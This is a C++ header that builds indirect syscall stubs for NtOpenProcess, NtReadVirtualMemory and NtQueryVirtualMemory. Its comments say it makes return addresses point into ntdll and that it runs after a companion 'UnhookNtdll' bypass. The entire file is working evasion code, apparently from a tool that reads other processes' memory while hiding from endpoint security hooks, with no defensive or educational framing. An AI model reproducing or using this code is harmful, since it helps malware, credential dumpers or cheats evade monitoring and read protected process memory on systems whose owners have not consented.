#pragma once
// syscall.h — indirect syscall stubs: NtReadVirtualMemory, NtQueryVirtualMemory, NtOpenProcess.
// jumps to the real syscall instruction inside ntdll so the return address
// on the stack points back into ntdll, not our code.  call Init() after
// ntdll .text has been restored (bypass::UnhookNtdll).

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#include <cstdint>
#include <cstring>

namespace sc {

constexpr long kStatusSuccess = 0;

using NtRVM_t = long(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
using NtQVM_t = long(NTAPI*)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
using NtOP_t  = long(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, PVOID);

struct ClientId {
    HANDLE uniqueProcess;
    HANDLE uniqueThread;
};

struct ObjAttr {
    ULONG  length;
    HANDLE rootDir;
    void*  objectName;
    ULONG  attributes;
    void*  securityDesc;
    void*  securityQos;
};

struct Stubs {
    NtRVM_t readVm   = nullptr;
    NtQVM_t queryVm  = nullptr;
    NtOP_t  openProc = nullptr;
    bool    ready    = false;

    bool Init() {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) return false;
        readVm   = Build<NtRVM_t>(ntdll, "NtReadVirtualMemory");
        queryVm  = Build<NtQVM_t>(ntdll, "NtQueryVirtualMemory");
        openProc = Build<NtOP_t>(ntdll, "NtOpenProcess");
        ready = readVm && queryVm && openProc;
        return ready;
    }

    void Teardown() {
        Free(readVm); Free(queryVm); Free(openProc);
        ready = false;
    }

private:
    static uint32_t SSN(HMODULE m, const char* name) {
        auto fn = reinterpret_cast<const BYTE*>(GetProcAddress(m, name));
        if (!fn) return UINT32_MAX;
        if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
            return *reinterpret_cast<const uint32_t*>(fn + 4);
        return UINT32_MAX;
    }

    static void* SyscallInsn(HMODULE m, const char* name) {
        auto fn = reinterpret_cast<BYTE*>(GetProcAddress(m, name));
        if (!fn) return nullptr;
        for (int i = 0; i < 32; ++i)
            if (fn[i] == 0x0F && fn[i + 1] == 0x05) return fn + i;
        return nullptr;
    }

    template <typename T>
    static T Build(HMODULE m, const char* name) {
        uint32_t ssn = SSN(m, name);
        if (ssn == UINT32_MAX) return nullptr;
        void* target = SyscallInsn(m, name);
        if (!target) return nullptr;

        // mov r10,rcx | mov eax,SSN | jmp [rip+0] | <8-byte addr>
        alignas(16) BYTE buf[22] = {
            0x4C, 0x8B, 0xD1,
            0xB8, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        *reinterpret_cast<uint32_t*>(buf + 4)  = ssn;
        *reinterpret_cast<void**>(buf + 14)    = target;

        void* mem = VirtualAlloc(nullptr, sizeof buf, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return nullptr;
        std::memcpy(mem, buf, sizeof buf);
        DWORD old;
        VirtualProtect(mem, sizeof buf, PAGE_EXECUTE_READ, &old);
        return reinterpret_cast<T>(mem);
    }

    template <typename T>
    static void Free(T& fn) {
        if (fn) { VirtualFree(reinterpret_cast<void*>(fn), 0, MEM_RELEASE); fn = nullptr; }
    }
};

inline Stubs g_sc;

}  // namespace sc
